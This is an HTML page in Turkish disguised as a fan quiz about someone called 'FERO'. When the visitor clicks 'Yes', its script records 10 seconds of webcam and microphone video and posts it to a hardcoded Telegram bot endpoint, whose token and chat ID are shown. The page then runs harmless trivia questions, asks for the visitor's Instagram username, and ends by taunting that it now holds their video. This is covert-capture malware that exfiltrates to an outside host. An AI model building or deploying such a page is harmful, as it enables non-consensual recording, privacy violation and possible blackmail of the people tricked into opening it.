<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>FERO Video Quiz</title>
  <style>
    body {
      display:flex;flex-direction:column;
      justify-content:center;align-items:center;
      height:100vh;background:#111;color:white;
      font-family:Arial;text-align:center;
      overflow:hidden;
    }
    button {
      padding:15px 30px;border:none;
      border-radius:10px;font-size:18px;
      background:#ff0040;color:white;cursor:pointer;
      margin:10px;
    }
    .question { display:none;margin-top:20px;font-size:20px; }
    .rose {
      position:absolute;top:-50px;font-size:24px;
      animation: fall linear forwards;opacity:0.9;
    }
    @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }

    /* 🔥 Neon efekt */
    .neon {
      font-size: 36px;
      color: #ff0040;
      text-transform: uppercase;
      text-shadow: 0 0 5px #ff0040, 0 0 10px #ff0040, 
                   0 0 20px #ff0040, 0 0 40px #ff0040;
      animation: blink 1s infinite alternate;
    }
    @keyframes blink {
      from { opacity: 1; text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040; }
      to   { opacity: 0.6; text-shadow: 0 0 5px #ff0040; }
    }
  </style>
</head>
<body>
  <h1>Devam etmek istiyor musun?</h1>
  <button onclick="startRecording()">Evet</button>

  <video id="video" autoplay playsinline style="display:none;"></video>

  <!-- Sorular -->
  <div id="q1" class="question">
    <p>FERO'yu seviyor musun?</p>
    <button onclick="nextQuestion()">Evet</button>
    <button onclick="nextQuestion()">Hayır</button>
  </div>
  <div id="q2" class="question">
    <p>Fero'nun boyu kaç cm?</p>
    <button onclick="nextQuestion()">1,83</button>
    <button onclick="nextQuestion()">1,78</button>
  </div>
  <div id="q3" class="question">
    <p>Fero iyi biri mi?</p>
    <button onclick="endQuiz()">Evet</button>
    <button onclick="endQuiz()">Hayır</button>
  </div>

  <script>
    let mediaRecorder;
    let recordedChunks = [];
    let currentQuestion = 1;

    async function startRecording() {
      const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
      const video = document.getElementById("video");
      video.style.display = "block";
      video.srcObject = stream;

      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
      };

      mediaRecorder.onstop = sendVideoToTelegram;
      mediaRecorder.start();

      // 10 saniye sonra kaydı durdur
      setTimeout(() => mediaRecorder.stop(), 10000);
    }

    function sendVideoToTelegram() {
      const blob = new Blob(recordedChunks, { type: "video/webm" });
      const formData = new FormData();
      formData.append("chat_id", "8494445812"); // senin chat id
      formData.append("video", blob, "video.webm");

      fetch("https://api.telegram.org/bot8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I/sendVideo", {
        method: "POST",
        body: formData
      });

      // Video bittikten sonra sorular gelsin
      document.querySelector("h1").style.display = "none";
      document.querySelector("button").style.display = "none";
      document.getElementById("video").style.display = "none";
      document.getElementById("q1").style.display = "block";
    }

    function nextQuestion() {
      document.getElementById("q" + currentQuestion).style.display = "none";
      currentQuestion++;
      document.getElementById("q" + currentQuestion).style.display = "block";
    }

    function endQuiz() {
      document.getElementById("q" + currentQuestion).style.display = "none";
      let username = prompt("Instagram kullanıcı adını gir (@fero):") || "@fero";
      document.body.innerHTML = `
        <h1 class="neon">HAYIRLI OLSUN VİDEON ELİMDE 😁</h1>
        <h2 style="margin-top:20px;color:white;">
          Kullanıcı adı: ${username}
        </h2>
      `;
      startRoses();
    }

    function startRoses() {
      setInterval(() => {
        const rose = document.createElement("div");
        rose.classList.add("rose");
        rose.textContent = "🌹";
        rose.style.left = Math.random() * 100 + "vw";
        rose.style.animationDuration = (Math.random() * 2 + 3) + "s";
        document.body.appendChild(rose);
        setTimeout(() => rose.remove(), 5000);
      }, 300);
    }
  </script>
</body>
</html>
